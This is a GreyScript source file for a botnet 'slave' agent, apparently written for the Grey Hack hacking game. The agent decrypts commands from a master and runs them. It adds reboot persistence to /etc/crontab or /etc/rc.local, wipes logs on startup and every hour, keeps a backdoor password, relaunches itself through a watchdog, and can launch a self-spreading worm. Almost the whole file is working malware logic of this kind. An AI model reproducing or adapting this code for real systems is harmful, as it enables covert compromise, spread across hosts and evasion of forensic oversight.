// ======================================
// slave.gs
// Bot agent: receives encrypted commands,
// executes, reports back to master
// Dependencies: kyber_lib.gs, lib_common.gs
// ======================================
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/config_manager.gs")
import_code("/scripts/utils/metrics.gs")
import_code("/scripts/utils/kyber_transport.gs")
import_code("/scripts/utils/forensics/persistence.gs")
import_code("/scripts/utils/accessLevel.gs")
import_code("/scripts/utils/parse_exploit_requirements.gs")
import_code("/scripts/utils/sanitize_ip.gs")
import_code("/scripts/utils/find_lib.gs")
import_code("/scripts/utils/forensics/watchdog_randomizer.gs")
import_code("/scripts/utils/botnet_config.gs")

// Initialize configuration
load_botnet_config()

// Use configuration values
CONFIG_DIR = get_config("paths.botnet_root")
PID_FILE = CONFIG_DIR + "/slave.pid"
VERSION = "1.0"
MASTER_PUBKEY_FILE = get_config("files.master_pub")
MY_PRIVKEY_FILE = get_config("files.slave_priv")
MY_PUBKEY_FILE = get_config("files.slave.pub")
COMMAND_DIR = CONFIG_DIR + "/commands"
RESPONSE_DIR = CONFIG_DIR + "/responses"

// ============================================
// Path validation: strict whitelist enforcement
// Prevents directory traversal attacks
// ============================================

safe_path = function(path)
    if path == null or path == "" then return false
    if typeof(path) != "string" then return false
    
    // Step 1: Reject obvious dangerous patterns
    if path.indexOf("../") == 0 then return false  // Starts with traversal
    if path.indexOf("..") > 0 then return false   // Contains traversal anywhere
    if path.indexOf("//") != -1 then return false   // Double slashes (potential bypass)
    if path.indexOf("~") != -1 then return false    // Home directory reference
    if path.indexOf("$") != -1 then return false    // Environment variable reference
    
    // Step 2: Normalize the path (resolve . and ..)
    parts = path.split("/")
    normalized = []
    
    for part in parts
        if part == "" or part == "." then
            continue  // Skip empty and current-dir references
        else if part == ".." then
            if normalized.len > 0 then
                normalized.pop  // Go up one level
            else
                return false  // Trying to go above root — reject
            end if
        else
            // Reject suspicious characters in path components
            if part.indexOf("<") != -1 or part.indexOf(">") != -1 or part.indexOf("|") != -1 then
                return false
            end if
            if part.indexOf("&") != -1 or part.indexOf(";") != -1 or part.indexOf("`") != -1 then
                return false
            end if
            normalized.push(part)
        end if
    end for
    
    clean_path = "/" + normalized.join("/")
    
    // Step 3: Check for symlink threats by verifying file type
    comp = get_shell.host_computer
    if comp != null then
        test_file = comp.File(clean_path)
        if test_file != null and not test_file.is_folder then
            // It's a file, check if it's a symlink (GreyScript limitation)
            // We can't directly check symlinks, so we rely on strict whitelist
        end if
    end if
    
    // Step 4: Strict whitelist matching with boundary checks
    allowed_prefixes = [
        "/root/.botnet/",
        "/scripts/utils/",
        "/bin/",
        "/tmp/"
    ]
    
    for prefix in allowed_prefixes
        // Match if: exact prefix match, or path starts with prefix and next char is /
        if clean_path == prefix then
            return true
        end if
        
        if clean_path.indexOf(prefix) == 0 then
            // Path starts with prefix — ensure it's a directory boundary
            rest = clean_path[prefix.len:]
            if rest != "" and rest[0] != "/" then
                // False positive: /scripts/utilities/file.gs would match /scripts/utils/
                continue
            end if
            
            // Additional check: prevent prefix spoofing
            // /root/.botnet-evil/file should not match /root/.botnet/
            if prefix != "/" then
                next_char = clean_path[prefix.len - 1]
                if next_char != "/" then
                    continue
                end if
            end if
            
            return true
        end if
    end for
    
    return false
end function

// Stricter validation for executed scripts (used in execute_command)
validate_script_executable = function(script_path)
    if not safe_path(script_path) then return false
    
    // Use configurable allowed scripts
    allowed_scripts = get_config("security.allowed_scripts")
    if allowed_scripts == null then
        // Fallback to hardcoded list if config fails
        allowed_scripts = [
            "/bin/slave.gs",
            "/bin/worm.gs",
            "/scripts/utils/forensics/wipe_logs.gs",
            "/scripts/utils/file_search.gs",
            "/scripts/utils/find_lib.gs",
            "/scripts/utils/accessLevel.gs"
        ]
    end if
    
    for allowed in allowed_scripts
        if script_path == allowed then return true
    end for
    
    return false
end function

// Validate command structure before execution (using shared library)
validate_command = function(cmd)
    return globals.validate_command(cmd)
end function

init = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder(CONFIG_DIR, "commands")
    comp.create_folder(CONFIG_DIR, "responses")
    comp.create_folder("/scripts", "utils")
    priv = read_file(MY_PRIVKEY_FILE)
    if not priv then
        keys = Kyber.generate_keypair()
        write_file(MY_PRIVKEY_FILE, keys.private)
        set_permissions(MY_PRIVKEY_FILE, "600")
        write_file(MY_PUBKEY_FILE, keys.public)
        set_permissions(MY_PUBKEY_FILE, "644")
        master_pub = read_file(MASTER_PUBKEY_FILE)
        if master_pub then
            write_file(RESPONSE_DIR + "/register.enc", Kyber.encrypt_message(master_pub, keys.public))
            set_permissions(RESPONSE_DIR + "/register.enc", "600")
        end if
        
        // NEW: Migrate existing backdoor password to Kyber
        backdoor_pass = read_file(CONFIG_DIR + "/backdoor_pass")
        if backdoor_pass then
            // Migrate existing XOR'd password to Kyber
            old_pass = xor_obfuscate(backdoor_pass, "botnet_key_2026")
            store_password_kyber(CONFIG_DIR + "/backdoor_pass.enc", old_pass)
            // Remove old file
            old_file = comp.File(CONFIG_DIR + "/backdoor_pass")
            if old_file then old_file.delete
        end if
    end if
    setup_cron()
    // Clean up logs after startup
    wipe_logs()
end function

setup_cron = function()
    comp = get_shell.host_computer
    cron = comp.File("/etc/crontab")
    if cron == null then
        // Fallback: add to /etc/rc.local
        rc = comp.File("/etc/rc.local")
        if rc == null then return
        content = rc.get_content
        if content == null then return
        if content.indexOf("/bin/slave.gs") == null then
            rc.set_content(content.replace("exit 0", "/bin/slave.gs\nexit 0"))
            log_master("Added rc.local persistence", "INFO")
        end if
        return
    end if
    content = cron.get_content
    if content == null then return
    if content.indexOf("/bin/slave.gs") == null then
        cron.set_content(content + "@reboot root /bin/slave.gs\n")
        log_master("Added cron persistence", "INFO")
    end if
end function

process_commands = function()
    comp = get_shell.host_computer
    cmd_dir = comp.File(COMMAND_DIR)
    if cmd_dir == null then return
    for f in cmd_dir.get_files
        if f == null then continue
        if f.name[-4:] == ".enc" then
            cipher = f.get_content
            if cipher == null then continue
            priv = read_file(MY_PRIVKEY_FILE)
            if priv == null then continue
            cmd = Kyber.decrypt_message(priv, cipher)
            if cmd == null then continue
            
            // Validate command format before execution
            if not validate_command(cmd) then
                log_master("Invalid command format received, discarding", "WARN")
                f.delete
                continue
            end if
            
            result = execute_command(cmd)
            if result == null then continue
            pub = read_file(MASTER_PUBKEY_FILE)
            if pub == null then continue
            resp_enc = Kyber.encrypt_message(pub, result)
            if resp_enc == null then continue
            resp_dir = comp.File(RESPONSE_DIR)
            if resp_dir then
                write_file(RESPONSE_DIR + "/" + f.name, resp_enc)
                set_permissions(RESPONSE_DIR + "/" + f.name, "600")
            end if
            f.delete
        end if
    end for
end function

execute_command = function(cmd)
    parts = cmd.split(" ")
    if parts.len == 0 then return "ERROR|empty command"
    
    allowed_cmds = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
    if allowed_cmds.indexOf(parts[0]) == null then return "ERROR|forbidden command"
    
    if parts[0] == "run" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        
        // Use stricter validation for scripts
        if not validate_script_executable(script) then
            return "ERROR|script not allowed"
        end if
        
        args = parts[2:]
        pid = get_shell.launch(script, args)
        return "RUNNING|" + pid
    
    else if parts[0] == "kill" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        if not validate_script_executable(script) then
            return "ERROR|script not allowed"
        end if
        kill_all(script)
        return "KILLED|" + script
    
    else if parts[0] == "read" then
        if parts.len < 2 then return "ERROR|missing file"
        file_path = parts[1]
        
        // Use safe_path for file reads
        if not safe_path(file_path) then
            return "ERROR|access denied"
        end if
        
        f = get_shell.host_computer.File(file_path)
        if f then return "FILE|" + f.get_content
        return "ERROR|file not found"
    
    else if parts[0] == "update" then
        return "UPDATE_READY"
    else if parts[0] == "status" then
        level = accessLevel(get_shell)
        return "ALIVE|" + VERSION + "|" + level
    else if parts[0] == "clean" then
        wipe_logs()
        return "CLEANED"
    else if parts[0] == "worm" then
        if parts.len < 3 then return "ERROR|need master_pub_file and depth"
        // Validate master_pub_file path
        if not safe_path(parts[1]) then return "ERROR|access denied"
        // parts: [worm, master_pub_file, depth, master_ip]
        master_ip = ""
        if parts.len >= 4 then master_ip = parts[3]
        get_shell.launch("/bin/worm.gs", [parts[1], parts[2], master_ip, "0"])
        return "WORM_STARTED"
    else if parts[0] == "rotate" then
        if typeof(rotate_watchdog_names) == "function" then
            rotate_watchdog_names()
            return "ROTATED"
        else
            return "ERROR|watchdog_randomizer not available"
        end if
    else
        return "UNKNOWN_COMMAND"
    end if
end function

watchdog = function()
    if get_pids("slave.gs").len == 0 then
        get_shell.launch("/bin/slave.gs")
    end if
end function

main = function()
    init()
    write_file(PID_FILE, str(get_shell.pid))
    set_permissions(PID_FILE, "600")
    master_pub = read_file(MASTER_PUBKEY_FILE)
    my_ip = get_shell.host_computer.public_ip
    my_ip_safe = sanitize_ip(my_ip)
    if master_pub then
        write_file(RESPONSE_DIR + "/startup.enc", Kyber.encrypt_message(master_pub, "STARTUP|" + VERSION + "|" + my_ip_safe))
        set_permissions(RESPONSE_DIR + "/startup.enc", "600")
    end if
    // Periodic cleanup every hour
    last_clean = time
    while true
        process_commands()
        if time - last_clean > 3600 then
            wipe_logs()
            last_clean = time
        end if
        wait(5)
    end while
end function

if get_pids("slave.gs").len > 1 then
    print("Slave already running")
    exit()
else
    main()
end if
